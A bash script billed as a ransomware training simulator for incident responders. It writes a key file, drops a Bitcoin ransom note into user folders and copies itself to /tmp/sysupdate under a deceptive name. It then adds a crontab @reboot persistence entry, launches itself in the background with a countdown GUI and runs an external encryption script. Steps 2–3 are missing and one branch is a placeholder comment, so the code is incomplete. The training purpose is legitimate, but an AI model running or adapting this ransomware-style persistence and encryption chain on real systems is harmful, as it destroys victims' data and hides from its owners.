#!/bin/bash
###############################################################################
# RANSOMWARE TRAINING SIMULATION - Main Trigger Script
#
# PURPOSE: Educational ransomware simulator for IRSP incident response training.
#          This is the "main" payload that orchestrates the entire attack simulation.
#
# ATTACK CHAIN (simulated):
#   1. Drop encryption key to disk
#   2. Generate threatening wallpaper
#   3. Change desktop wallpaper
#   4. Deploy ransom notes to each target directory
#   5. Establish persistence (crontab)
#   6. Launch intimidation countdown window
#   7. Encrypt target files
#
# TRAINING OBJECTIVES - Responders should learn to:
#   - Identify malicious processes (/tmp/sysupdate)
#   - Find persistence mechanisms (crontab @reboot entries)
#   - Locate encryption keys and ransom notes
#   - Analyze the attack timeline and kill chain
#   - Practice containment and eradication procedures
#
# WARNING: FOR CONTROLLED TRAINING ENVIRONMENTS ONLY.
###############################################################################

# --- Configuration ---
SCRIPT_DIR="/home/irspuser/.local"
KEY_FILE="/home/irspuser/.local/.encryption_key"
WALLPAPER_FILE="/home/irspuser/.local/skull_wallpaper.png"
ENCRYPT_SCRIPT="/home/irspuser/.local/encrypt.sh"
PERSISTENCE_PATH="/tmp/sysupdate"

# Target directories for ransom note deployment
TARGET_DIRS=(
    "/home/irspuser/Documents"
    "/home/irspuser/Downloads"
    "/home/irspuser/Pictures"
)

# Attack parameters (these are clues for incident responders)
BITCOIN_WALLET="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
CONTACT_EMAIL="decrypt@evil.onion"
RANSOM_AMOUNT="0.5 Bitcoin (\$15,000 USD)"
DEADLINE_MINUTES=30
DEADLINE_SECONDS=$((DEADLINE_MINUTES * 60))

###############################################################################
# STEP 1: Save Encryption Key
#
# TRAINING NOTE: Real ransomware often generates a random AES key per victim,
# encrypts it with an RSA public key, and sends it to a C2 server.
# The local copy may be deleted. Here we leave it for trainees to find.
###############################################################################
echo "[STEP 1] Saving encryption key..."
mkdir -p "$SCRIPT_DIR"
echo -n "slartibartfast" > "$KEY_FILE"
# Make the key file hidden (it already starts with a dot)
chmod 600 "$KEY_FILE"
echo "[DONE]   Key saved to $KEY_FILE"



###############################################################################
# STEP 4: Deploy Ransom Notes - COOL & REALISTIC VERSION
###############################################################################
echo "[STEP 4] Deploying high-impact ransomware note..."

RANSOM_NOTE_HTML='<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>⚠️ CRITICAL - FILES ENCRYPTED ⚠️</title>
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Creepster&family=Courier+Prime&display=swap");

        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(180deg, #1a0000, #000000, #1a0000);
            color: #ffdddd;
            font-family: "Courier Prime", monospace;
            overflow: hidden;
        }
        .container {
            max-width: 860px;
            margin: 40px auto;
            padding: 40px;
            border: 3px solid #ff0000;
            border-radius: 8px;
            background: rgba(10, 0, 0, 0.95);
            box-shadow: 0 0 40px #ff0000, inset 0 0 30px rgba(255,0,0,0.3);
        }
        .skull {
            font-size: 4.5em;
            text-align: center;
            margin: -20px 0 10px 0;
            animation: pulse 2s infinite;
            filter: drop-shadow(0 0 15px #ff0000);
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.08); }
        }
        h1 {
            color: #ff3333;
            text-align: center;
            font-size: 2.6em;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
            letter-spacing: 4px;
            margin: 10px 0 30px 0;
        }
        .deadline {
            background: #330000;
            border: 2px solid #ff6666;
            color: #ffff00;
            font-size: 1.8em;
            font-weight: bold;
            padding: 15px;
            text-align: center;
            margin: 25px 0;
            animation: flash 800ms infinite alternate;
        }
        @keyframes flash {
            from { opacity: 1; color: #ffff00; }
            to { opacity: 0.7; color: #ff4444; }
        }
        .info {
            background: #111;
            padding: 20px;
            border-left: 6px solid #ff0000;
            margin: 25px 0;
            text-align: left;
        }
        .bitcoin-box {
            background: #001a00;
            border: 2px dashed #00ff00;
            padding: 20px;
            font-size: 1.35em;
            word-break: break-all;
            color: #00ff88;
            text-align: center;
            margin: 25px 0;
            box-shadow: 0 0 15px #00ff00;
        }
        button {
            background: #ff0000;
            color: white;
            border: none;
            padding: 14px 32px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s;
        }
        button:hover {
            background: #ff5555;
            transform: scale(1.05);
            box-shadow: 0 0 20px #ff0000;
        }
        .warning {
            color: #ffaa00;
            font-size: 1.1em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="skull">☠︎</div>

        <h1>YOUR FILES HAVE BEEN ENCRYPTED</h1>

        <div class="deadline">
            ⏰ YOU HAVE 30 MINUTES TO PAY ⏰
        </div>

        <div class="info">
            <strong>All your documents, photos, videos, and databases have been encrypted with military-grade AES-256 encryption.</strong><br><br>
            Files now end with <strong>.locked</strong> and are inaccessible.
        </div>

        <h2 style="color:#ff6666; text-align:center;">HOW TO RECOVER</h2>

        <ol style="max-width:700px; margin:20px auto; font-size:1.1em;">
            <li>Send exactly <strong>${RANSOM_AMOUNT}</strong> in Bitcoin to the address below</li>
            <li>Email the transaction ID to <strong>${CONTACT_EMAIL}</strong></li>
            <li>Receive your private decryption key within 1 hour</li>
        </ol>

        <div class="bitcoin-box">
            <strong>BITCOIN WALLET ADDRESS</strong><br><br>
            ${BITCOIN_WALLET}
        </div>

        <div style="text-align:center;">
            <button onclick="copyWallet()">COPY WALLET ADDRESS</button>
            <button onclick="window.location.reload()">REFRESH STATUS</button>
        </div>

        <div class="info warning">
            <strong>⚠️ WARNINGS ⚠️</strong><br><br>
            • Do not attempt to decrypt files yourself<br>
            • Do not shut down or restart your computer<br>
            • After 30 minutes the decryption key will be permanently deleted<br>
            • This is your only chance to recover your data
        </div>

        <div style="text-align:center; margin-top:40px; color:#555; font-size:0.9em;">
            Victim ID: IRSP-2025-$(date +%s)<br>
            Encryption: AES-256-CBC • Mode: Military
        </div>
    </div>

    <script>
        function copyWallet() {
            navigator.clipboard.writeText("${BITCOIN_WALLET}");
            const btns = document.querySelectorAll("button");
            btns[0].textContent = "✅ COPIED!";
            setTimeout(() => { btns[0].textContent = "COPY WALLET ADDRESS"; }, 2500);
        }

        // Fake "connection" blinking effect
        setInterval(() => {
            document.title = document.title === "⚠️ CRITICAL - FILES ENCRYPTED ⚠️"
                          ? "🔴 RANSOMWARE ACTIVE 🔴"
                          : "⚠️ CRITICAL - FILES ENCRYPTED ⚠️";
        }, 1200);
    </script>
</body>
</html>'

# Deploy the note
for dir in "${TARGET_DIRS[@]}"; do
    if [ -d "$dir" ] || mkdir -p "$dir"; then
        echo "$RANSOM_NOTE_HTML" > "$dir/RANSOM_NOTE.html"
        echo "[DONE] Cool ransom note deployed → $dir/RANSOM_NOTE.html"
    fi
done

###############################################################################
# STEP 5: Establish Persistence
#
# Copies the script to /tmp/sysupdate and adds a crontab entry to run it
# at every reboot. This is a common persistence technique used by malware.
#
# TRAINING NOTE: Incident responders should check for:
#   - Suspicious files in /tmp (especially with deceptive names like 'sysupdate')
#   - Crontab entries for all users (crontab -l, /etc/crontab, /etc/cron.d/)
#   - Systemd services, init scripts, autostart entries
#   - This persistence mechanism ensures the ransomware survives reboots
###############################################################################
echo "[STEP 5] Establishing persistence..."

# Copy this script to /tmp with a deceptive name
# Real malware often disguises itself as system processes
cp "$0" "$PERSISTENCE_PATH" 2>/dev/null || cp "${SCRIPT_DIR}/trigger.sh" "$PERSISTENCE_PATH" 2>/dev/null
chmod +x "$PERSISTENCE_PATH" 2>/dev/null
echo "[DONE]   Payload copied to $PERSISTENCE_PATH"

# Add crontab persistence - the @reboot directive runs the command at system startup
# We preserve existing crontab entries and add our malicious entry
(crontab -l 2>/dev/null | grep -v "$PERSISTENCE_PATH"; echo "@reboot $PERSISTENCE_PATH") | crontab - 2>/dev/null
echo "[DONE]   Crontab persistence established (@reboot $PERSISTENCE_PATH)"

###############################################################################
# STEP 6: Launch Payload in Background
#
# Launch the persistence copy in the background. In real malware, this ensures
# the malicious process is running from the expected path (/tmp/sysupdate).
# Incident responders should find this process in 'ps aux' output.
###############################################################################
echo "[STEP 6] Launching background payload..."

# We don't re-execute if we ARE already the /tmp/sysupdate process
# (prevents infinite fork loop)
if [[ "$0" != "$PERSISTENCE_PATH" ]]; then
    # Launch in background - will appear as /tmp/sysupdate in process listing
    # The & puts it in background, disown detaches it from this terminal
    nohup "$PERSISTENCE_PATH" --from-persistence &>/dev/null &
    disown
    echo "[DONE]   Background payload launched (PID: $!)"
else
    echo "[INFO]   Running as persistence payload, skipping re-launch."
fi

###############################################################################
# STEP 7: Launch Realistic Persistent Countdown GUI (Python + Tkinter)
###############################################################################
echo "[STEP 7] Launching realistic ransomware GUI countdown..."

# Ensure Python3 and tkinter are available (install if needed for training env)
if ! command -v python3 &>/dev/null; then
    echo "[WARN] Python3 not found. Falling back to zenity."
    # ... (your original zenity code)
else
    GUI_SCRIPT="/home/irspuser/.local/ransom_countdown.py"

    # Launch in background with persistence
    if [[ "$0" != "$PERSISTENCE_PATH" ]]; then
        nohup python3 "$GUI_SCRIPT" --from-persistence &>/dev/null &
        disown
        echo "[DONE] Persistent Tkinter ransomware GUI launched (hard to close, topmost)"
    else
        echo "[INFO] Running from persistence - GUI already handled."
    fi
fi

###############################################################################
# STEP 8: Execute File Encryption
#
# This is the destructive payload - calls the encryption script to encrypt
# all target files. This is the last step because we want all the
# intimidation elements in place before the user notices file changes.
#
# TRAINING NOTE: The encryption phase is where data loss actually occurs.
# Quick detection and response BEFORE this step completes can save files.
# This is why monitoring and alerting are critical in real environments.
###############################################################################
echo "[STEP 8] Executing file encryption..."
echo ""

# Only run encryption if not launched from persistence (avoid re-encrypting)
if [[ "$1" != "--from-persistence" ]]; then
    if [ -f "$ENCRYPT_SCRIPT" ]; then
        bash "$ENCRYPT_SCRIPT"
    else
        echo "[ERROR]  Encryption script not found: $ENCRYPT_SCRIPT"
        echo "[INFO]   Expected location: $ENCRYPT_SCRIPT"
    fi
else
    echo "[INFO]   Running from persistence - skipping re-encryption."
fi

###############################################################################
# ATTACK SIMULATION COMPLETE
###############################################################################
echo ""
echo "=============================================="
echo "  RANSOMWARE SIMULATION DEPLOYMENT COMPLETE"
echo "=============================================="
echo "  Encryption Key : $KEY_FILE"
echo "  Wallpaper      : $WALLPAPER_FILE"
echo "  Persistence    : $PERSISTENCE_PATH"
echo "  Crontab        : @reboot $PERSISTENCE_PATH"
echo "  Ransom Notes   : RANSOM_NOTE.html (in each target dir)"
echo "=============================================="
echo ""
echo "  TRAINING: Incident responders should now:"
echo "  1. Identify the malicious process (/tmp/sysupdate)"
echo "  2. Check crontab for persistence"
echo "  3. Locate and analyze ransom notes"
echo "  4. Find the encryption key"
echo "  5. Run the decryption script to recover files"
echo "=============================================="
